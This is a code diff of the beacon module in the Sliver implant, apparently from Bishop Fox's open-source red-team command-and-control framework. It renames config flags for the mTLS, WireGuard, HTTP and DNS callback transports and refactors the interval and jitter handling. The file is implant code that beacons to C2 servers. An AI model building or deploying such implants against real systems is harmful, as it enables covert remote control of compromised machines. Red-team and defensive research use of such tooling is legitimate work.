@@ -30,20 +30,18 @@ import (
 	"net/url"
 	"time"
 
-	"strconv"
-
-	// {{if .Config.MTLSc2Enabled}}
+	// {{if .Config.IncludeMTLS}}
 	"crypto/tls"
 
 	"github.com/bishopfox/sliver/implant/sliver/transports/mtls"
 
 	// {{end}}
 
-	// {{if .Config.HTTPc2Enabled}}
+	// {{if .Config.IncludeHTTP}}
 	"github.com/bishopfox/sliver/implant/sliver/transports/httpclient"
 	// {{end}}
 
-	// {{if .Config.WGc2Enabled}}
+	// {{if .Config.IncludeWG}}
 	"errors"
 	"net"
 
@@ -52,7 +50,11 @@ import (
 
 	// {{end}}
 
-	// {{if .Config.DNSc2Enabled}}
+	// {{if or .Config.IncludeMTLS .Config.IncludeWG}}
+	"strconv"
+	// {{end}}
+
+	// {{if .Config.IncludeDNS}}
 
 	"github.com/bishopfox/sliver/implant/sliver/transports/dnsclient"
 	// {{end}}
@@ -86,20 +88,12 @@ type Beacon struct {
 
 // Interval - Interval between beacons
 func (b *Beacon) Interval() int64 {
-	interval, err := strconv.ParseInt(`{{.Config.BeaconInterval}}`, 10, 64)
-	if err != nil {
-		interval = int64(30 * time.Second)
-	}
-	return int64(interval)
+	return GetInterval()
 }
 
 // Jitter - Jitter between beacons
 func (b *Beacon) Jitter() int64 {
-	jitter, err := strconv.ParseInt(`{{.Config.BeaconJitter}}`, 10, 64)
-	if err != nil {
-		jitter = int64(30 * time.Second)
-	}
-	return int64(jitter)
+	return GetJitter()
 }
 
 // Duration - Interval + random value <= Jitter
@@ -109,7 +103,7 @@ func (b *Beacon) Duration() time.Duration {
 	// {{end}}
 	jitterDuration := time.Duration(0)
 	if 0 < b.Jitter() {
-		jitterDuration = time.Duration(int64(insecureRand.Intn(int(b.Jitter()))))
+		jitterDuration = time.Duration(insecureRand.Int63n(b.Jitter()))
 	}
 	duration := time.Duration(b.Interval()) + jitterDuration
 	// {{if .Config.Debug}}
@@ -119,7 +113,7 @@ func (b *Beacon) Duration() time.Duration {
 }
 
 // StartBeaconLoop - Starts the beacon loop generator
-func StartBeaconLoop(c2s []string, abort <-chan struct{}) <-chan *Beacon {
+func StartBeaconLoop(abort <-chan struct{}) <-chan *Beacon {
 	// {{if .Config.Debug}}
 	log.Printf("Starting beacon loop ...")
 	// {{end}}
@@ -128,7 +122,7 @@ func StartBeaconLoop(c2s []string, abort <-chan struct{}) <-chan *Beacon {
 	nextBeacon := make(chan *Beacon)
 
 	innerAbort := make(chan struct{})
-	c2Generator := C2Generator(c2s, innerAbort)
+	c2Generator := C2Generator(innerAbort)
 
 	go func() {
 		defer close(nextBeacon)
@@ -147,28 +141,28 @@ func StartBeaconLoop(c2s []string, abort <-chan struct{}) <-chan *Beacon {
 			switch uri.Scheme {
 
 			// *** MTLS ***
-			// {{if .Config.MTLSc2Enabled}}
+			// {{if .Config.IncludeMTLS}}
 			case "mtls":
 				beacon = mtlsBeacon(uri)
-				// {{end}}  - MTLSc2Enabled
+				// {{end}}  - IncludeMTLS
 			case "wg":
 				// *** WG ***
-				// {{if .Config.WGc2Enabled}}
+				// {{if .Config.IncludeWG}}
 				beacon = wgBeacon(uri)
-				// {{end}}  - WGc2Enabled
+				// {{end}}  - IncludeWG
 			case "https":
 				fallthrough
 			case "http":
 				// *** HTTP ***
-				// {{if .Config.HTTPc2Enabled}}
+				// {{if .Config.IncludeHTTP}}
 				beacon = httpBeacon(uri)
-				// {{end}} - HTTPc2Enabled
+				// {{end}} - IncludeHTTP
 
 			case "dns":
 				// *** DNS ***
-				// {{if .Config.DNSc2Enabled}}
+				// {{if .Config.IncludeDNS}}
 				beacon = dnsBeacon(uri)
-				// {{end}} - DNSc2Enabled
+				// {{end}} - IncludeDNS
 
 			default:
 				// {{if .Config.Debug}}
@@ -186,7 +180,7 @@ func StartBeaconLoop(c2s []string, abort <-chan struct{}) <-chan *Beacon {
 	return nextBeacon
 }
 
-// {{if .Config.MTLSc2Enabled}}
+// {{if .Config.IncludeMTLS}}
 func mtlsBeacon(uri *url.URL) *Beacon {
 	// {{if .Config.Debug}}
 	log.Printf("Beacon -> %s", uri.String())
@@ -217,11 +211,13 @@ func mtlsBeacon(uri *url.URL) *Beacon {
 			return mtls.WriteEnvelope(conn, envelope)
 		},
 		Close: func() error {
-			err = conn.Close()
-			if err != nil {
-				return err
+			if conn != nil {
+				err = conn.Close()
+				if err != nil {
+					return err
+				}
+				conn = nil
 			}
-			conn = nil
 			return nil
 		},
 		Cleanup: func() error {
@@ -234,7 +230,7 @@ func mtlsBeacon(uri *url.URL) *Beacon {
 
 // {{end}}
 
-// {{if .Config.WGc2Enabled}}
+// {{if .Config.IncludeWG}}
 func wgBeacon(uri *url.URL) *Beacon {
 	// {{if .Config.Debug}}
 	log.Printf("Establishing Beacon -> %s", uri.String())
@@ -294,7 +290,7 @@ func wgBeacon(uri *url.URL) *Beacon {
 
 // {{end}}
 
-// {{if .Config.HTTPc2Enabled}}
+// {{if .Config.IncludeHTTP}}
 func httpBeacon(uri *url.URL) *Beacon {
 
 	// {{if .Config.Debug}}
@@ -339,7 +335,7 @@ func httpBeacon(uri *url.URL) *Beacon {
 
 // {{end}}
 
-// {{if .Config.DNSc2Enabled}}
+// {{if .Config.IncludeDNS}}
 func dnsBeacon(uri *url.URL) *Beacon {
 	var client *dnsclient.SliverDNSClient
 	var err error
@@ -347,7 +343,7 @@ func dnsBeacon(uri *url.URL) *Beacon {
 		ActiveC2: uri.String(),
 		Init: func() error {
 			opts := dnsclient.ParseDNSOptions(uri)
-			client, err = dnsclient.DNSStartSession(uri.Host, opts)
+			client, err = dnsclient.DNSStartSession(uri.Hostname(), opts)
 			if err != nil {
 				// {{if .Config.Debug}}
 				log.Printf("[beacon] dns connection error %s", err)
@@ -375,6 +371,6 @@ func dnsBeacon(uri *url.URL) *Beacon {
 	return beacon
 }
 
-// {{end}} - DNSc2Enabled
+// {{end}} - IncludeDNS
 
 // {{end}} - IsBeacon
